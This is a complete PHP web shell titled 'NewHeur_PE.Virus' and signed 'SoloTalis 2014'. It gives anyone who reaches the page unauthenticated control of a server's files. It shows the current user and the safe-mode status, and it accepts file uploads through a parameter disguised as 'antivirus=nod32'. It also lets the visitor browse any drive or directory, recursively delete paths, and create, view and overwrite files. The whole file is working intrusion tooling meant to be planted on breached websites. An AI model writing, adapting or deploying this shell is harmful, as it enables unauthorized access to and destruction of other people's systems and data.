<?php
/*
SoloTalis 2014
*/
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
<title>NewHeur_PE.Virus</title>
<style>
p {
height: 15px;
color: rgb(0,255,0);
font-size:small;
}
div#newHeur{
left: 170px;
top: 0px;
position: absolute;
}
div#box {
padding: 10px;
border: 5px solid gray;
margin: 0px; 
left: 5px;
right: 5px ;
top: 140px;
position: absolute;
color: #8FAFAF;
height:410px;
}
hr {
display: block;
height: 1px;
border: 0;
border-top: 1px solid #ccc;
margin: 1em 0;
padding: 0;
}
div#upload {
right: 170px;
top: 0px;
position: absolute;
}
p.upload {
top: 10px;
left: -265px;
position : absolute;
}
div.where {
top: 80px;
left : 50px;
position: absolute;
}
input[type="text"]
{
font-size:11px;
width:350px;
}
div#wrornot {
color: white;
top: 0px;
right : 28px;
position: absolute;
}
div#whoami{
top:33px;
left:44%;
position:absolute;
}
a{
color:#00D5FF;
text-decoration: none;
}
a:hover
{
color:white;
font-weight: bolder;
}
.btx{
border-top: 1px solid #96d1f8;
background: #65a9d7;
background: -webkit-gradient(linear, left top, left bottom, from(#3e779d), to(#65a9d7));
background: -webkit-linear-gradient(top, #3e779d, #65a9d7);
background: -moz-linear-gradient(top, #3e779d, #65a9d7);
background: -ms-linear-gradient(top, #3e779d, #65a9d7);
background: -o-linear-gradient(top, #3e779d, #65a9d7);
padding: 2px 4px;
-webkit-border-radius: 6px;
-moz-border-radius: 6px;
border-radius: 6px;
-webkit-box-shadow: rgba(0,0,0,1) 0 1px 0;
-moz-box-shadow: rgba(0,0,0,1) 0 1px 0;
box-shadow: rgba(0,0,0,1) 0 1px 0;
text-shadow: rgba(0,0,0,.4) 0 1px 0;
color: white;
font-size: 10px;
font-family: Georgia, serif;
text-decoration: none;
vertical-align: middle;
}
.btx:hover{
border-top-color: #28597a;
background: #28597a;
color: #ccc;
}
.btx:active {
border-top-color: #1b435e;
background: #1b435e;
}
div.flask {
	height:400px;
	overflow: auto;
}
.goback {
	top:109px;
	left:50px;
	position:absolute;
}
.button {
	top:112px;
	left:60;
	position:absolute;
  font: bold 11px Arial;
  text-decoration: none;
  background-color: #EEEEEE;
  color: #333333;
  padding: 2px 6px 2px 6px;
  border-top: 1px solid #CCCCCC;
  border-right: 1px solid #333333;
  border-bottom: 1px solid #333333;
  border-left: 1px solid #CCCCCC;
}
.gotohome {
	left:0px;
	top:0px;
	position:absolute;
}
.filefool {
color:#91DBFF;
}
.filefool:hover{color:#D5FF91;}
/* */
td + td {
  border-left:1px solid #eee;
}
td, th {
  border-bottom:1px solid #eee;
  color: #000;
  padding: 1px 25px;
}
th {
  height: 0;
  line-height: 0;
  padding-top: 0;
  padding-bottom: 0;
  color: transparent;
  border: none;
  white-space: nowrap;
}
th div{
  position: absolute;
  background: transparent;
  color: #fff;
  padding: 9px 25px;
  top: 0;
  margin-left: -25px;
  line-height: normal;
  border-left: 1px solid #FFFFFF;
}
th:first-child div{
  border: none;
}
section {
  position: relative;
  border: 1px solid #000;
  padding-top: 37px;
  background: #000000;
}
section.positioned {
  position: absolute;
  top:100px;
  left:100px;
  width:800px;
  box-shadow: 0 0 15px #333;
}
.container {
  overflow-y: auto;
  height: 380px;
}
table {
  border-spacing: 0;
  width:100%;
}
</style>
</head>
<body bgcolor="#000000">
<?php
error_reporting(0);


//$_GET['dir'] = $_POST['drive'];

if($_GET['dir'] === "\\"){
$gor = __DIR__;
$_GET['dir'] = $gor[0]."\\";
}
if (isset($GET['ether_flask'])){
$ether_flask = $_GET['ether_flask'];
}
if(isset($_GET['dir'])){
$pth = $_GET['dir'];
}
if (( null !== DIRECTORY_SEPARATOR) && DIRECTORY_SEPARATOR == '/') {
$pxq = true;
$hook = __DIR__ . "/";
}else{
$pxq = false;
$hook = __DIR__ . "\\";
}
if(isset($pth)){
if($pxq == true){
if(substr(trim($pth), -1) !== "/"){
$pth = $pth."/";
}}
if($pxq == false){
if(substr(trim($pth), -1) !== "\\"){
$pth = $pth."\\";
}}}
if(!isset($pth)){$pth = $hook;}

if(!is_dir($pth)){$pth=$hook;}
if(isset($_GET['antivirus']) && ($_GET['antivirus'] == "nod32")){
if(is_writable($pth)){
$upf = $pth . basename($_FILES['userfile']['name']);
echo '<div id="upload"><p class="upload">';
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $upf) == true ){
echo "File was successfully uploaded.\n";
}}else
{echo('<div id="upload">
<p style="color:rgb(255,15,0);right: 40px;top: 15px;width: 175px;position: absolute;">
This folder is not writable');}}
echo "</p></div>";
if(isset($_GET['mv'])){

}
if(isset($_GET['lo'])){
if($_GET['lo'] !== __FILE__){
function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }

        return rmdir($path);
    }

    else if (is_file($path) === true)
    {
        return unlink($path);
    }

    return false;
}
Delete($_GET['lo']);
//header_remove();
header('Location:?dir='.dirname($_GET['lo']));
//die();
}
}
$goback = '<div>
<a class="button" href="?dir='.dirname($_GET['ether_flask']).' ">GoBack</a>
</div>';
?>
<div id="newHeur">
<p>NewHeur</p>
</div>
<div id="whoami" style="color:white;">
<?php echo 'whoami: <strong style="color:rgb(255,15,0);">' . get_current_user().'</strong>';
echo '<br>Safe Mode: ';
if( ini_get('safe_mode') ){ 
echo '<strong style="color:red;">ON</strong>'; 
}else{ 
echo '<strong style="color:rgb(0,255,0);">OFF</strong>'; 
}?> 
</div>
<div id="upload">
<form enctype="multipart/form-data" action="?<?php if($pth){echo 'dir='.$pth.'&';}?>antivirus=nod32" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="512000" />
<input style="color:white;font-size: x-small;" name="userfile" type="file" />
<input type="submit" value="upload" />
</form>
</div>
<?php if(isset($_GET['ether_flask'])){
echo $goback ;}
?>
<div class="where">
<form action="" method="get" style="height:0;">
<input type="submit" value="Goto =>">
<input type="text" name="dir" value="
<?php
if(isset($_GET['ether_flask']) && !empty($_GET['ether_flask'])){
	if (is_file($_GET['ether_flask'])){
	if($pxq == true){
		$pth = dirname($_GET['ether_flask']).'/';
	}
	if($pxq == false){
	$pth = dirname($_GET['ether_flask']);
	}
	echo $pth;
	}}else {echo $pth;}?>">
</form>
</div>
<div id="drives" style="left: 120px;top: 110px;position:absolute;">
<?php
$letters = null;
echo '<form action="?" method="get">';
echo "<select name='dir' onchange='if(this.value != 0) { this.form.submit(); }'>";
foreach (range("A","Z") as $letter) {
$x = __FILE__;
$x = $x[0];
$v = $_GET['dir'];
$v = $v[0];
$bool = is_dir($letter.":\\");
if ($bool){
if ($letter == $v ){ $flask = 'selected="selected"' ;}else{$flask = null;}
$letters .= "<option value=".$letter.":\\ ".$flask.">";
	if ($letter.":" != $x){
	$letters .= $letter;
	} else {
	$letters .= "<span class='gaya'>".$letter."</span>";
	} $letters .= ":\\ </option>";
	}
	}
echo $letters;
echo "</select></form>";
?>
</div>
<div id="home">
<a href="?" class="gotohome"><img src="data:image/gif;base64,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" alt="home">
</a>
</div>
<div id="wrornot">
<?php
echo "Can I Upload here ? ";
if (is_writable($pth)) {
echo '<div style="color:rgb(0,255,0);">Yes ^^</div>';
} else {
echo '<div style="color:red;">No :/</div>';
}
?>
</div>
<div id="box">
<?php if (!isset($_GET['ether_flask'])){
if(isset($_POST['mknew'])){
    if (isset($_POST['mkdir'])) {
        mkdir($pth.$_POST['mknew']);
    }
    if (isset($_POST['mkfile'])) {
		$mknew = $pth.$_POST['mknew'];
        $mkfile = fopen($mknew, 'w');
		fclose($mkfile);
		die('<meta http-equiv="Refresh" content="0; URL=?ether_flask='.$mknew.'&e=1">');
    }
}
?>
<section class="">
  <div class="container">
    <table>
      <thead>
        <tr class="header">
          <th>
           <div>File name</div>
          </th>
          <th>
            <div>Tools</div>
          </th>
          <th>
            <div>Size</div>
          </th>
		  <th>
           <div>chmod</div>
          </th>
		    <th>
           <div>Owner && Group</div>
          </th>
        </tr>
      </thead>
      <tbody>
<tr>
<td><a href="?dir=<?php echo dirname($pth) . PHP_EOL;?>">&#8656;</a></td>
<td style="width:160;"><form method="post" style="height:8;width: 190;position: relative;">
<input type="text" name="mknew" style="width:100;"/>
<input class="btx" type="submit" name="mkdir" value="mkdir" />
<input class="btx" type="submit" name="mkfile" value="mkfile" />
</form>
</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<?php
if(!$pth){$talis = '*';}else{$talis = $pth;}
foreach(glob($talis.'*',GLOB_ONLYDIR) as $key=>$value){
if($pth){$values = str_replace($pth,'',$value);}

if(strlen($values)>25){
$arr = str_split($values, 25);
$after = "";
foreach ($arr as $item) {
    $after .= $item.'<br>';
}}else{
	$after = $values;
}
?>

<tr>
<td><?php if(is_dir($value)){echo '<a href="?dir='.$pth.$values.'">'.$after.'</a>';
}else{echo '<a class="filefool" href="?ether_flask='.$pth.$values.'">'.$values.'</a>';} ?></td>
          <td><a class="btx" href="?mv=<?php echo $value ?>" >Rename</a>
			<a class="btx" href="?lo=<?php echo $value ?>" >Delete</a>
		  </td>
		  <td><p><?php echo "Directory"; ?></p></td>
		  <td><?php if (is_writable($value)) {
$col = 'color:rgb(0,255,0)';
} else if (is_readable($value)){
$col = 'color:white';
} else {
$col = 'color:rgb(255,15,0)';
}
echo '<div style="text-align:center;"><strong style="'.$col.'">'.substr(sprintf('%o', fileperms($value)), -4).'</strong></div>'; ?></td>
		  <td><p>
<?php
if (DIRECTORY_SEPARATOR == '/') {
echo posix_getpwuid(fileowner($value))['name'];
echo " && ";
echo posix_getgrgid(filegroup($value))['name'];
}else{
//window
echo "N/A && N/A";
}
?>
</p></td></tr>
<?php }
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' B';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' B';
        }
        else
        {
            $bytes = '0 B';
        }

        return $bytes;
}
if(!$pth){$talis = '*';}else{$talis = $pth;}
foreach(glob($talis.'*') as $key=>$value){
if($pth){$values = str_replace($pth,'',$value);}
if(is_file($value)){
?>
<tr>
<td><?php echo '<p><a href="?ether_flask='.$pth.$values.'">'.$values.'</a></p>' ; ?></td>
<td><?php echo '<a class="btx" href="?lo='.$value.'" >Delete</a>
<a class="btx" href="?ether_flask='.$value.'" >View</a>
<a class="btx" href="?ether_flask='.$value.'&e=1" >Edit</a>'; ?></td>
<td><?php echo '<p>'.formatSizeUnits(filesize($value)).'</p>' ; ?></td>

<td><?php if (is_writable($value)) {
$col = 'color:rgb(0,255,0)';
} else if (is_readable($value)){
$col = 'color:white';
} else {
$col = 'color:rgb(255,15,0)';
}
echo '<div style="text-align:center;"><strong style="'.$col.'">'.substr(sprintf('%o', fileperms($value)), -4).'</strong></div>'; ?>
</td>
<td>
<p>
<?php
if (DIRECTORY_SEPARATOR == '/') {
echo posix_getpwuid(fileowner($value))['name'];
echo " && ";
echo posix_getgrgid(filegroup($value))['name'];
}else{
//window
echo "N/A && N/A";
}
echo '</div></p>'; }}}?>
</td></tr></tbody></table></section> 
<?php /*else*/ if (isset($_GET['ether_flask'])) {
$hitman = "readonly";
$file = $_GET['ether_flask'];
if(!is_file($_GET['ether_flask'])){ die();}
if(isset($_POST['hunter'])){file_put_contents($file, $_POST['hunter']);}
if(isset($_GET['e'])){if($_GET['e'] == 1 ){$hitman = null;}}

if(is_file($file)&&file_exists($file)){

if(!function_exists('mime_content_type')) {

    function mime_content_type($filename) {

        $mime_types = array(

            'txt' => 'text/plain',
            'htm' => 'text/html',
            'html' => 'text/html',
            'php' => 'text/html',
            'css' => 'text/css',
            'js' => 'application/javascript',
            'json' => 'application/json',
            'xml' => 'application/xml',
            'swf' => 'application/x-shockwave-flash',
            'flv' => 'video/x-flv',

            // images
            'png' => 'image/png',
            'jpe' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'jpg' => 'image/jpeg',
            'gif' => 'image/gif',
            'bmp' => 'image/bmp',
            'ico' => 'image/vnd.microsoft.icon',
            'tiff' => 'image/tiff',
            'tif' => 'image/tiff',
            'svg' => 'image/svg+xml',
            'svgz' => 'image/svg+xml',

            // archives
            'zip' => 'application/zip',
            'rar' => 'application/x-rar-compressed',
            'exe' => 'application/x-msdownload',
            'msi' => 'application/x-msdownload',
            'cab' => 'application/vnd.ms-cab-compressed',

            // audio/video
            'mp3' => 'audio/mpeg',
            'qt' => 'video/quicktime',
            'mov' => 'video/quicktime',

            // adobe
            'pdf' => 'application/pdf',
            'psd' => 'image/vnd.adobe.photoshop',
            'ai' => 'application/postscript',
            'eps' => 'application/postscript',
            'ps' => 'application/postscript',

            // ms office
            'doc' => 'application/msword',
            'rtf' => 'application/rtf',
            'xls' => 'application/vnd.ms-excel',
            'ppt' => 'application/vnd.ms-powerpoint',

            // open office
            'odt' => 'application/vnd.oasis.opendocument.text',
            'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
        );

        $ext = strtolower(array_pop(explode('.',$filename)));
        if (array_key_exists($ext, $mime_types)) {
            return $mime_types[$ext];
        }
        elseif (function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME);
            $mimetype = finfo_file($finfo, $filename);
            finfo_close($finfo);
            return $mimetype;
        }
        else {
            return 'application/octet-stream';
        }
    }
}
$mime = mime_content_type($file);

	}
if (strpos($mime,'image') !== false) {
	$img = base64_encode(file_get_contents($file));
	//$file = str_replace("\\","/",$file);
    list($width, $height) = getimagesize($file);
	if ($height >= $width){$height = "100%";$width="auto";}else{$height= "auto";$width="100%";}
	echo '<strong><img src="data:'.$mime.';base64,'.$img.'" style="height:'.$height.';width:'.$width.';"></strong>';
}else { // if((strpos($mime,'text') !== false) OR (strpos($mime,'php') !== false) ) {
	$txt = file_get_contents($file);
	if(!empty(htmlspecialchars($txt))){
	$txt = htmlspecialchars($txt) ;}
	

if($hitman == null){
$root = '<form action="?ether_flask='.$file.'&e=1" method="post">';
$toor = '<input class="hunter" type="submit" value="Save"></form>';
}else{
$root = '<div>
<a class="hunter" href="?ether_flask='.$file.'&e=1 ">Edit</a>
</div>';
$toor = null;
}
	

echo "<style>
textarea {
  width: 100%;
  height:100%;
  resize: none;
  color:rgb(0,255,0);
  background-color: black;
  overflow-x: hidden;
}
.hunter{
    position: absolute;
    right: 0;
    top: -35;
	font: bold 11px Arial;
	text-decoration: none;
	background-color: #EEEEEE;
	color: #333333;
	padding: 2px 6px 2px 6px;
	border-top: 1px solid #CCCCCC;
	border-right: 1px solid #333333;
	border-bottom: 1px solid #333333;
	border-left: 1px solid #CCCCCC;
}
</style>
".$root."
<textarea name=\"hunter\"".$hitman.">".$txt."</textarea>
".$toor."
</table>
</tbody>
</div>
</body>
</html>" ;}} ?>